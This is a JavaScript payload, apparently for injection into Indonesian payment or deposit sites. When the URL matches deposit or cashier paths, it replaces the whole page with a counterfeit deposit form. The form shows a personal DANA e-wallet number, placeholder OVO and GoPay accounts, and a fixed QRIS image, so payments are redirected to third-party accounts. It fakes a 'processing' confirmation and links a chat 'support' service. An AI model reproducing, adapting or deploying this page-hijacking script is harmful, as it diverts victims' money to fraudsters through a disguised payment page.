(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/metode/?bank=',
    '/?bank=',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Formulir Deposit - Layanan Keamanan</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <!-- Font Poppins -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
      :root {
        --primary: #4361ee;
        --primary-dark: #3a56d4;
        --secondary: #06d6a0;
        --secondary-dark: #05b989;
        --accent: #7209b7;
        --accent-dark: #5e0895;
        --warning: #ff9e00;
        --danger: #ef476f;
        --dark: #0f172a;
        --dark-light: #1e293b;
        --dark-lighter: #334155;
        --light: #f8fafc;
        --light-gray: #cbd5e1;
        --success: #06d6a0;
        --border-radius-lg: 16px;
        --border-radius-md: 12px;
        --border-radius-sm: 8px;
        --shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
        --shadow-lg: 0 15px 40px rgba(0, 0, 0, 0.25);
        --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      }
      
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      
      body {
        font-family: 'Poppins', sans-serif;
        background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
        color: var(--light);
        min-height: 100vh;
        padding: 20px;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      
      .deposit-container {
        max-width: 520px;
        width: 100%;
        background: var(--dark-light);
        border-radius: var(--border-radius-lg);
        overflow: hidden;
        box-shadow: var(--shadow-lg);
        border: 1px solid var(--dark-lighter);
      }
      
      .deposit-header {
        background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
        padding: 28px 24px;
        text-align: center;
        position: relative;
        overflow: hidden;
      }
      
      .deposit-header::before {
        content: '';
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: radial-gradient(circle, rgba(255,255,255,0.1) 1%, transparent 20%);
        animation: pulse 8s infinite linear;
      }
      
      @keyframes pulse {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      
      .header-content {
        position: relative;
        z-index: 2;
      }
      
      .deposit-header h1 {
        font-size: 26px;
        font-weight: 700;
        margin-bottom: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
      }
      
      .deposit-header p {
        font-size: 15px;
        opacity: 0.9;
        font-weight: 300;
        margin-bottom: 0;
      }
      
      .alert-marquee {
        background: rgba(255, 158, 0, 0.12);
        border-bottom: 1px solid rgba(255, 158, 0, 0.2);
        padding: 14px 0;
        overflow: hidden;
      }
      
      .marquee-content {
        display: inline-flex;
        align-items: center;
        gap: 12px;
        padding-left: 100%;
        animation: marquee 18s linear infinite;
        white-space: nowrap;
      }
      
      @keyframes marquee {
        0% { transform: translateX(0); }
        100% { transform: translateX(-100%); }
      }
      
      .alert-icon {
        color: var(--warning);
        font-size: 16px;
      }
      
      .deposit-body {
        padding: 28px 24px;
      }
      
      .nav-tabs-custom {
        background: var(--dark);
        border-radius: var(--border-radius-md);
        padding: 6px;
        margin-bottom: 24px;
        border: none;
      }
      
      .nav-tabs-custom .nav-link {
        color: var(--light-gray);
        border: none;
        border-radius: var(--border-radius-sm);
        padding: 14px 20px;
        font-weight: 600;
        font-size: 15px;
        flex: 1;
        text-align: center;
        transition: var(--transition);
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
      }
      
      .nav-tabs-custom .nav-link.active {
        background: var(--primary);
        color: white;
        box-shadow: 0 6px 15px rgba(67, 97, 238, 0.3);
      }
      
      .nav-tabs-custom .nav-link:hover:not(.active) {
        background: rgba(255, 255, 255, 0.05);
      }
      
      .support-btn {
        width: 100%;
        background: linear-gradient(135deg, var(--accent) 0%, var(--accent-dark) 100%);
        border: none;
        border-radius: var(--border-radius-md);
        padding: 16px;
        font-weight: 600;
        font-size: 16px;
        margin-bottom: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        transition: var(--transition);
        box-shadow: 0 8px 20px rgba(114, 9, 183, 0.25);
      }
      
      .support-btn:hover {
        transform: translateY(-3px);
        box-shadow: 0 12px 25px rgba(114, 9, 183, 0.4);
      }
      
      .tab-content {
        margin-top: 8px;
      }
      
      .form-label {
        font-weight: 500;
        font-size: 15px;
        color: var(--light-gray);
        margin-bottom: 10px;
        display: flex;
        align-items: center;
        gap: 8px;
      }
      
      .form-control, .form-select {
        background: var(--dark);
        border: 1px solid var(--dark-lighter);
        border-radius: var(--border-radius-sm);
        color: var(--light);
        padding: 14px 16px;
        font-size: 15px;
        transition: var(--transition);
        font-family: 'Poppins', sans-serif;
      }
      
      .form-control:focus, .form-select:focus {
        background: var(--dark);
        border-color: var(--primary);
        color: var(--light);
        box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
      }
      
      .form-control::placeholder {
        color: var(--light-gray);
        opacity: 0.6;
      }
      
      .input-group-text {
        background: var(--dark-lighter);
        border: 1px solid var(--dark-lighter);
        color: var(--light-gray);
        border-radius: var(--border-radius-sm);
      }
      
      .bank-card {
        background: var(--dark);
        border-radius: var(--border-radius-md);
        padding: 24px;
        margin-top: 20px;
        border: 1px solid var(--dark-lighter);
        display: none;
      }
      
      .bank-card.active {
        display: block;
        animation: fadeIn 0.5s ease;
      }
      
      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
      }
      
      .bank-header {
        display: flex;
        align-items: center;
        gap: 16px;
        margin-bottom: 20px;
        padding-bottom: 16px;
        border-bottom: 1px solid var(--dark-lighter);
      }
      
      .bank-logo {
        width: 64px;
        height: 64px;
        border-radius: 12px;
        object-fit: contain;
        background: white;
        padding: 8px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      }
      
      .bank-info h4 {
        font-size: 18px;
        font-weight: 600;
        margin-bottom: 4px;
      }
      
      .bank-info p {
        font-size: 14px;
        color: var(--light-gray);
        margin-bottom: 0;
      }
      
      .account-details {
        background: var(--dark-light);
        border-radius: var(--border-radius-sm);
        padding: 20px;
        margin-bottom: 20px;
        border: 1px solid var(--dark-lighter);
      }
      
      .account-number {
        font-family: 'Courier New', monospace;
        font-size: 20px;
        font-weight: 600;
        letter-spacing: 1px;
        color: var(--light);
        margin-bottom: 12px;
      }
      
      .copy-btn {
        background: var(--primary);
        border: none;
        border-radius: var(--border-radius-sm);
        padding: 10px 20px;
        font-weight: 600;
        font-size: 14px;
        transition: var(--transition);
        display: flex;
        align-items: center;
        gap: 8px;
      }
      
      .copy-btn:hover {
        background: var(--primary-dark);
        transform: translateY(-2px);
        box-shadow: 0 6px 15px rgba(67, 97, 238, 0.3);
      }
      
      .alert-custom {
        background: rgba(255, 158, 0, 0.1);
        border-left: 4px solid var(--warning);
        border-radius: 0 var(--border-radius-sm) var(--border-radius-sm) 0;
        padding: 16px;
        margin: 20px 0;
        display: flex;
        align-items: flex-start;
        gap: 12px;
      }
      
      .alert-custom.info {
        background: rgba(67, 97, 238, 0.1);
        border-left-color: var(--primary);
      }
      
      .alert-icon {
        font-size: 18px;
        margin-top: 2px;
      }
      
      .alert-custom p {
        margin-bottom: 0;
        font-size: 14px;
        line-height: 1.5;
      }
      
      .submit-btn {
        width: 100%;
        background: linear-gradient(135deg, var(--secondary) 0%, var(--secondary-dark) 100%);
        border: none;
        border-radius: var(--border-radius-md);
        padding: 18px;
        font-weight: 600;
        font-size: 16px;
        margin-top: 10px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        transition: var(--transition);
        box-shadow: 0 8px 20px rgba(6, 214, 160, 0.25);
      }
      
      .submit-btn:hover:not(:disabled) {
        transform: translateY(-3px);
        box-shadow: 0 12px 25px rgba(6, 214, 160, 0.4);
      }
      
      .submit-btn:disabled {
        opacity: 0.6;
        cursor: not-allowed;
      }
      
      .qr-container {
        text-align: center;
        margin-top: 24px;
        display: none;
      }
      
      .qr-container.active {
        display: block;
        animation: fadeIn 0.5s ease;
      }
      
      .qr-code-wrapper {
        width: 240px;
        height: 240px;
        background: white;
        border-radius: var(--border-radius-md);
        padding: 20px;
        margin: 0 auto 24px;
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        border: 1px solid var(--dark-lighter);
      }
      
      .qr-code {
        width: 100%;
        height: 100%;
        object-fit: contain;
      }
      
      .qr-actions {
        display: flex;
        gap: 12px;
        margin-top: 24px;
      }
      
      .qr-actions .btn {
        flex: 1;
        padding: 14px;
        border-radius: var(--border-radius-sm);
        font-weight: 600;
        font-size: 15px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        transition: var(--transition);
      }
      
      .spinner-border {
        width: 40px;
        height: 40px;
        color: var(--primary);
      }
      
      .deposit-footer {
        text-align: center;
        padding: 24px;
        border-top: 1px solid var(--dark-lighter);
        background: var(--dark);
      }
      
      .secure-badge {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        background: rgba(6, 214, 160, 0.1);
        color: var(--success);
        padding: 8px 16px;
        border-radius: 50px;
        font-size: 14px;
        font-weight: 500;
        margin-bottom: 16px;
      }
      
      .footer-logo {
        max-width: 280px;
        border-radius: var(--border-radius-sm);
        opacity: 0.9;
        transition: var(--transition);
      }
      
      .footer-logo:hover {
        opacity: 1;
      }
      
      /* Toast Notification */
      .toast-container {
        position: fixed;
        bottom: 24px;
        left: 0;
        right: 0;
        z-index: 9999;
        display: flex;
        justify-content: center;
        pointer-events: none;
      }
      
      .toast-custom {
        background: var(--dark-light);
        border: 1px solid var(--dark-lighter);
        border-radius: var(--border-radius-md);
        padding: 16px 20px;
        box-shadow: var(--shadow-lg);
        display: flex;
        align-items: center;
        gap: 12px;
        max-width: 320px;
        transform: translateY(100px);
        opacity: 0;
        transition: var(--transition);
        pointer-events: auto;
      }
      
      .toast-custom.show {
        transform: translateY(0);
        opacity: 1;
      }
      
      .toast-custom.success {
        border-left: 4px solid var(--success);
      }
      
      .toast-custom.error {
        border-left: 4px solid var(--danger);
      }
      
      .toast-custom.info {
        border-left: 4px solid var(--primary);
      }
      
      .toast-icon {
        font-size: 20px;
      }
      
      .toast-custom.success .toast-icon {
        color: var(--success);
      }
      
      .toast-custom.error .toast-icon {
        color: var(--danger);
      }
      
      .toast-custom.info .toast-icon {
        color: var(--primary);
      }
      
      .toast-body {
        font-size: 14px;
        font-weight: 500;
      }
      
      /* Responsive */
      @media (max-width: 576px) {
        body {
          padding: 15px;
        }
        
        .deposit-container {
          border-radius: var(--border-radius-md);
        }
        
        .deposit-header {
          padding: 24px 20px;
        }
        
        .deposit-header h1 {
          font-size: 22px;
        }
        
        .deposit-body {
          padding: 24px 20px;
        }
        
        .qr-actions {
          flex-direction: column;
        }
        
        .qr-code-wrapper {
          width: 200px;
          height: 200px;
        }
      }
    </style>
  `;

  document.body.innerHTML = `
    <div class="deposit-container">
      <!-- Header -->
      <div class="deposit-header">
        <div class="header-content">
          <h1><i class="bi bi-wallet2"></i> Formulir Deposit</h1>
          <p>Lakukan deposit dengan mudah, cepat, dan aman</p>
        </div>
      </div>
      
      <!-- Alert Marquee -->
      <div class="alert-marquee">
        <div class="marquee-content">
          <i class="bi bi-exclamation-triangle-fill alert-icon"></i>
          <span>Deposit wajib sesuai dengan yang ada di formulir deposit. Transaksi pertama wajib menggunakan kode unik (contoh: 50.123). Jika tidak sesuai syarat, deposit akan gagal diproses.</span>
        </div>
      </div>
      
      <!-- Main Content -->
      <div class="deposit-body">
        <!-- Tabs -->
        <ul class="nav nav-tabs-custom nav-fill" id="depositTabs" role="tablist">
          <li class="nav-item" role="presentation">
            <button class="nav-link active" id="manual-tab" data-bs-toggle="tab" data-bs-target="#manual-tab-pane" type="button" role="tab">
              <i class="bi bi-cash-coin"></i> Manual Transfer
            </button>
          </li>
          <li class="nav-item" role="presentation">
            <button class="nav-link" id="qris-tab" data-bs-toggle="tab" data-bs-target="#qris-tab-pane" type="button" role="tab">
              <i class="bi bi-qr-code-scan"></i> QRIS
            </button>
          </li>
        </ul>
        
        <!-- Support Button -->
        <button class="btn support-btn" onclick="openHelp()">
          <i class="bi bi-headset"></i> Bantuan Deposit Online
        </button>
        
        <!-- Tab Content -->
        <div class="tab-content" id="depositTabContent">
          <!-- Manual Transfer Tab -->
          <div class="tab-pane fade show active" id="manual-tab-pane" role="tabpanel" tabindex="0">
            <div class="mb-4">
              <label class="form-label">
                <i class="bi bi-credit-card"></i> Pilih Metode Pembayaran
              </label>
              <select class="form-select" id="bank-select" onchange="selectMethod(this.value)">
                <option value="" selected disabled>Pilih metode pembayaran...</option>
                <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgpSc_j6RrvzR4yXB3aJvMKum3-dbfqVJVwo_xCgZmnA&s=10","name":"DANA","number":"0895327827948","owner":"M ALVIN"}'>DANA</option>
                <option value='{"logo":"https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dari_OVO.svg/1200px-Logo_dari_OVO.svg.png","name":"OVO","number":"089912345678","owner":"JOHN DOE"}'>OVO</option>
                <option value='{"logo":"https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Gopay_logo.svg/2560px-Gopay_logo.svg.png","name":"GOPAY","number":"089987654321","owner":"JANE SMITH"}'>GOPAY</option>
              </select>
            </div>
            
            <!-- Bank Card (Hidden by default) -->
            <div id="bank-card" class="bank-card">
              <div class="bank-header">
                <img id="bank-logo" class="bank-logo" src="" alt="Logo Bank">
                <div class="bank-info">
                  <h4 id="bank-name"></h4>
                  <p id="bank-owner"></p>
                </div>
              </div>
              
              <div class="account-details">
                <div class="d-flex justify-content-between align-items-center mb-3">
                  <span class="text-muted">Nomor Rekening / E-Wallet</span>
                </div>
                <div class="account-number" id="bank-number"></div>
                <button class="btn copy-btn w-100" onclick="copyNumber()">
                  <i class="bi bi-clipboard"></i> Salin Nomor
                </button>
              </div>
              
              <div class="alert-custom">
                <i class="bi bi-exclamation-triangle-fill alert-icon"></i>
                <p>Pastikan Anda mentransfer ke nomor di atas dengan benar. Periksa kembali sebelum melakukan transfer.</p>
              </div>
              
              <div class="mb-4">
                <label class="form-label">
                  <i class="bi bi-currency-exchange"></i> Nominal Deposit
                </label>
                <div class="input-group">
                  <span class="input-group-text">Rp</span>
                  <input type="text" class="form-control" id="manual-nominal" placeholder="50.000" oninput="formatRupiah(this)">
                </div>
                <div class="form-text text-end">Minimal deposit: Rp 50.000</div>
              </div>
              
              <button class="btn submit-btn" onclick="submitManualDeposit()" id="manual-submit-btn">
                <i class="bi bi-send-check"></i> Kirim Deposit
              </button>
              
              <div id="manual-result" class="mt-3"></div>
            </div>
          </div>
          
          <!-- QRIS Tab -->
          <div class="tab-pane fade" id="qris-tab-pane" role="tabpanel" tabindex="0">
            <div class="mb-4">
              <label class="form-label">
                <i class="bi bi-currency-exchange"></i> Nominal Deposit
              </label>
              <div class="input-group">
                <span class="input-group-text">Rp</span>
                <input type="text" class="form-control" id="auto-nominal" placeholder="50.000" oninput="formatRupiah(this)">
              </div>
              <div class="form-text text-end">Minimal deposit: Rp 50.000</div>
            </div>
            
            <div class="alert-custom info">
              <i class="bi bi-info-circle-fill alert-icon"></i>
              <p>QRIS dapat digunakan untuk berbagai e-wallet dan mobile banking seperti DANA, OVO, GoPay, ShopeePay, LinkAja, dan bank lainnya.</p>
            </div>
            
            <button class="btn submit-btn" onclick="generateQRIS()" id="qris-generate-btn">
              <i class="bi bi-qr-code"></i> Buat QRIS
            </button>
            
            <!-- QR Container (Hidden by default) -->
            <div id="qr-container" class="qr-container">
              <div class="qr-code-wrapper">
                <img id="qris-img" class="qr-code" src="" alt="QR Code">
              </div>
              
              <div class="alert-custom info">
                <i class="bi bi-camera-fill alert-icon"></i>
                <p>Scan QR code di atas menggunakan aplikasi e-wallet atau mobile banking Anda untuk melakukan pembayaran.</p>
              </div>
              
              <div class="qr-actions">
                <button class="btn btn-primary" onclick="downloadQRIS()">
                  <i class="bi bi-download"></i> Download QR
                </button>
                <button class="btn btn-success" onclick="finishPayment()">
                  <i class="bi bi-check-circle"></i> Sudah Bayar
                </button>
              </div>
            </div>
            
            <div id="auto-result" class="mt-3"></div>
          </div>
        </div>
      </div>
      
      <!-- Footer -->
      <div class="deposit-footer">
        <div class="secure-badge">
          <i class="bi bi-shield-check"></i> Transaksi 100% Aman & Terjamin
        </div>
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" 
             alt="Secure Payment" class="footer-logo">
      </div>
    </div>
    
    <!-- Toast Container -->
    <div class="toast-container">
      <div id="toast" class="toast-custom">
        <i id="toast-icon" class="toast-icon"></i>
        <div id="toast-body" class="toast-body"></div>
      </div>
    </div>
  `;

  // Format Rupiah Function
  window.formatRupiah = function(input) {
    let value = input.value.replace(/\D/g, '');
    
    if (!value) {
      input.value = '';
      return;
    }
    
    // Format to Indonesian Rupiah
    let rupiah = '';
    let valueRev = value.toString().split('').reverse().join('');
    
    for (let i = 0; i < valueRev.length; i++) {
      rupiah += valueRev[i];
      if ((i + 1) % 3 === 0 && i !== (valueRev.length - 1)) {
        rupiah += '.';
      }
    }
    
    input.value = rupiah.split('').reverse().join('');
    
    // Validation styling
    const numericValue = parseInt(value);
    if (numericValue < 50000) {
      input.style.borderColor = 'var(--danger)';
      input.style.boxShadow = '0 0 0 3px rgba(239, 71, 111, 0.2)';
    } else {
      input.style.borderColor = 'var(--success)';
      input.style.boxShadow = '0 0 0 3px rgba(6, 214, 160, 0.2)';
    }
  };

  // Get numeric value from formatted Rupiah
  function getNumericValue(formattedValue) {
    return parseInt(formattedValue.replace(/\./g, ''));
  }

  // Toast Notification
  function showToast(msg, type = "success") {
    const toast = document.getElementById("toast");
    const toastIcon = document.getElementById("toast-icon");
    const toastBody = document.getElementById("toast-body");
    
    // Set icon based on type
    let iconClass = '';
    switch(type) {
      case 'success':
        iconClass = 'bi-check-circle-fill';
        break;
      case 'error':
        iconClass = 'bi-x-circle-fill';
        break;
      case 'info':
        iconClass = 'bi-info-circle-fill';
        break;
      default:
        iconClass = 'bi-info-circle-fill';
    }
    
    toastIcon.className = `toast-icon bi ${iconClass}`;
    toastBody.textContent = msg;
    
    // Set toast type
    toast.className = 'toast-custom';
    toast.classList.add(type);
    
    // Show toast
    setTimeout(() => {
      toast.classList.add('show');
    }, 10);
    
    // Hide after 3 seconds
    setTimeout(() => {
      toast.classList.remove('show');
    }, 3000);
  }

  // Select Payment Method
  window.selectMethod = function (jsonStr) {
    if (!jsonStr) {
      document.getElementById('bank-card').classList.remove('active');
      return;
    }
    
    try {
      const method = JSON.parse(jsonStr);
      document.getElementById('bank-logo').src = method.logo;
      document.getElementById('bank-name').textContent = method.name;
      document.getElementById('bank-number').textContent = method.number;
      document.getElementById('bank-owner').textContent = `a/n ${method.owner}`;
      
      document.getElementById('bank-card').classList.add('active');
      
      // Reset input
      document.getElementById('manual-nominal').value = '';
      
      showToast(`Metode ${method.name} dipilih`, 'info');
    } catch (error) {
      showToast('Gagal memuat metode pembayaran', 'error');
    }
  };

  // Copy Account Number
  window.copyNumber = function () {
    const num = document.getElementById('bank-number').textContent;
    if (!num || num === '') {
      showToast('Nomor rekening kosong', 'error');
      return;
    }
    
    navigator.clipboard.writeText(num).then(() => {
      showToast('Nomor rekening berhasil disalin ke clipboard', 'success');
    }).catch(() => {
      // Fallback for older browsers
      const textArea = document.createElement('textarea');
      textArea.value = num;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      showToast('Nomor rekening berhasil disalin', 'success');
    });
  };

  // Submit Manual Deposit
  window.submitManualDeposit = function () {
    const formattedValue = document.getElementById('manual-nominal').value;
    const nominal = getNumericValue(formattedValue);
    const bankCard = document.getElementById('bank-card');
    
    if (!bankCard.classList.contains('active')) {
      showToast('Pilih metode pembayaran terlebih dahulu', 'error');
      return;
    }
    
    if (!nominal || nominal < 50000) {
      showToast('Minimal deposit adalah Rp 50.000', 'error');
      return;
    }
    
    const btn = document.getElementById('manual-submit-btn');
    const originalText = btn.innerHTML;
    
    // Disable button and show loading
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner-border spinner-border-sm me-2" role="status"></span> Memproses...';
    
    const resultDiv = document.getElementById('manual-result');
    resultDiv.innerHTML = '<div class="text-center"><div class="spinner-border text-primary" role="status"></div><p class="mt-2">Memproses deposit Anda...</p></div>';
    
    // Simulate API call
    setTimeout(() => {
      btn.disabled = false;
      btn.innerHTML = originalText;
      
      const formattedNominal = new Intl.NumberFormat('id-ID', {
        style: 'currency',
        currency: 'IDR',
        minimumFractionDigits: 0
      }).format(nominal);
      
      resultDiv.innerHTML = `
        <div class="alert alert-success d-flex align-items-center" role="alert">
          <i class="bi bi-check-circle-fill me-2"></i>
          <div>
            Deposit sebesar <strong>${formattedNominal}</strong> sedang diproses. Silakan tunggu konfirmasi dari CS kami.
          </div>
        </div>
      `;
      
      showToast('Deposit berhasil dikirim!', 'success');
      
      // Redirect back after 3 seconds
      setTimeout(() => {
        history.back();
      }, 3000);
    }, 2000);
  };

  // Generate QRIS
  window.generateQRIS = function () {
    const formattedValue = document.getElementById('auto-nominal').value;
    const nominal = getNumericValue(formattedValue);
    
    if (!nominal || nominal < 50000) {
      showToast('Minimal deposit adalah Rp 50.000', 'error');
      return;
    }
    
    const btn = document.getElementById('qris-generate-btn');
    const originalText = btn.innerHTML;
    
    // Disable button and show loading
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner-border spinner-border-sm me-2" role="status"></span> Membuat QRIS...';
    
    const resultDiv = document.getElementById('auto-result');
    resultDiv.innerHTML = '<div class="text-center"><div class="spinner-border text-primary" role="status"></div><p class="mt-2">Membuat QRIS untuk nominal yang dipilih...</p></div>';
    
    // Simulate QR generation
    setTimeout(() => {
      btn.disabled = false;
      btn.innerHTML = originalText;
      resultDiv.innerHTML = '';
      
      const qrUrl = "https://imagizer.imageshack.com/img922/592/X4lzqE.jpg";
      document.getElementById('qris-img').src = qrUrl;
      document.getElementById('qr-container').classList.add('active');
      
      const formattedNominal = new Intl.NumberFormat('id-ID', {
        style: 'currency',
        currency: 'IDR',
        minimumFractionDigits: 0
      }).format(nominal);
      
      showToast(`QRIS untuk ${formattedNominal} berhasil dibuat!`, 'success');
      
      // Scroll to QR code
      document.getElementById('qr-container').scrollIntoView({
        behavior: 'smooth',
        block: 'center'
      });
    }, 1500);
  };

  // Download QRIS
  window.downloadQRIS = function () {
    const qrUrl = "https://imagizer.imageshack.com/img922/592/X4lzqE.jpg";
    const formattedValue = document.getElementById('auto-nominal').value;
    const nominal = getNumericValue(formattedValue);
    const fileName = nominal ? `qris-deposit-${nominal}-${Date.now()}.png` : `qris-deposit-${Date.now()}.png`;
    
    const link = document.createElement('a');
    link.href = qrUrl;
    link.download = fileName;
    link.target = '_blank';
    
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    
    showToast('QRIS berhasil diunduh', 'success');
  };

  // Finish Payment
  window.finishPayment = function () {
    const formattedValue = document.getElementById('auto-nominal').value;
    const nominal = getNumericValue(formattedValue);
    
    if (nominal) {
      const formattedNominal = new Intl.NumberFormat('id-ID', {
        style: 'currency',
        currency: 'IDR',
        minimumFractionDigits: 0
      }).format(nominal);
      
      showToast(`Terima kasih! Pembayaran ${formattedNominal} akan segera diproses`, 'success');
    } else {
      showToast('Terima kasih! Pembayaran Anda akan segera diproses', 'success');
    }
    
    setTimeout(() => {
      history.back();
    }, 2000);
  };

  // Open Help
  window.openHelp = function () {
    showToast('Membuka layanan bantuan customer service...', 'info');
    
    setTimeout(() => {
      window.open("https://direct.lc.chat/19347249", "_blank");
    }, 800);
  };

  // Initialize Bootstrap components
  window.addEventListener('DOMContentLoaded', () => {
    // Initialize Bootstrap tabs
    const triggerTabList = [].slice.call(document.querySelectorAll('#depositTabs button'));
    triggerTabList.forEach(function (triggerEl) {
      const tabTrigger = new bootstrap.Tab(triggerEl);
      
      triggerEl.addEventListener('click', function (event) {
        event.preventDefault();
        tabTrigger.show();
      });
    });
    
    // Set default bank if needed
    const bankSelect = document.getElementById('bank-select');
    if (bankSelect.value) {
      selectMethod(bankSelect.value);
    }
    
    // Auto format existing values
    const nominalInputs = document.querySelectorAll('#manual-nominal, #auto-nominal');
    nominalInputs.forEach(input => {
      if (input.value) {
        formatRupiah(input);
      }
    });
  });
})();
